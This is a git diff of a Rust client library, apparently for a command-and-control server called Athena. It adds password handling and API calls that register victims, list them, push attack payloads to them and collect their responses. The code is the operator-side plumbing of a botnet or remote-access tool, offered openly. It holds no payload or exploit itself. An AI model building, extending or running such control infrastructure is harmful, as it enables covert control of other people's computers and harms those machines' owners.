@@ -14,21 +14,31 @@
  * You should have received a copy of the GNU Affero General Public License
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
-use url::Url;
+use std::error::Error;
 
 use reqwest::Client;
+use url::Url;
 
 pub mod payload;
 pub mod routes;
 pub use routes::V1_ROUTES;
 
+use payload::attack::Password;
+use payload::*;
+
 #[derive(Clone, Default)]
 pub struct AthenaClientBuilder {
     client: Option<Client>,
     host: Option<String>,
+    password: Option<Password>,
 }
 
 impl AthenaClientBuilder {
+    pub fn password(&mut self, password: String) -> &mut Self {
+        self.password = Some(Password { password });
+        self
+    }
+
     pub fn client(&mut self, client: Client) -> &mut Self {
         self.client = Some(client);
         self
@@ -42,11 +52,12 @@ impl AthenaClientBuilder {
         self
     }
 
-    pub fn build(&mut self) -> AthenaClient {
-        AthenaClient {
+    pub fn build(&mut self) -> AthenaResult<AthenaClient> {
+        Ok(AthenaClient {
             client: self.client.clone().unwrap(),
-            host: Url::parse(&self.host.clone().unwrap()).unwrap(),
-        }
+            password: self.password.clone().unwrap(),
+            host: Url::parse(&self.host.clone().unwrap())?,
+        })
     }
 }
 
@@ -54,11 +65,67 @@ impl AthenaClientBuilder {
 pub struct AthenaClient {
     client: Client,
     host: Url,
+    password: Password,
 }
 
 impl AthenaClient {
-    pub async fn register(&self) {
-        let url = self.host.clone().join(V1_ROUTES.victim.join);
-        //self.client.post(url).json();
+    pub async fn register(&self) -> AthenaResult<()> {
+        let url = self.host.clone().join(V1_ROUTES.victim.join)?;
+        self.client.post(url).send().await?;
+        Ok(())
+    }
+
+    pub async fn attack_list_victims(&self) -> AthenaResult<Vec<attack::Victim>> {
+        let url = self.host.clone().join(V1_ROUTES.attack.list_victims)?;
+        Ok(self
+            .client
+            .post(url)
+            .json(&self.password)
+            .send()
+            .await?
+            .json()
+            .await?)
+    }
+
+    pub async fn attack_set_payload(
+        &self,
+        payload: &attack::Payload,
+    ) -> AthenaResult<Vec<attack::PayloadID>> {
+        let url = self.host.clone().join(V1_ROUTES.attack.set_payload)?;
+
+        Ok(self
+            .client
+            .post(url)
+            .json(&payload)
+            .send()
+            .await?
+            .json()
+            .await?)
+    }
+
+    pub async fn read_response(
+        &self,
+        payload: &attack::PayloadID,
+    ) -> AthenaResult<Vec<attack::PayloadResponse>> {
+        let payload = attack::ResponseReq {
+            id: payload.id,
+            password: self.get_password().to_owned(),
+        };
+        let url = self.host.clone().join(V1_ROUTES.attack.read_response)?;
+
+        Ok(self
+            .client
+            .post(url)
+            .json(&payload)
+            .send()
+            .await?
+            .json()
+            .await?)
+    }
+
+    pub fn get_password(&self) -> &str {
+        &self.password.password
     }
 }
+
+pub type AthenaResult<T> = Result<T, Box<dyn Error>>;
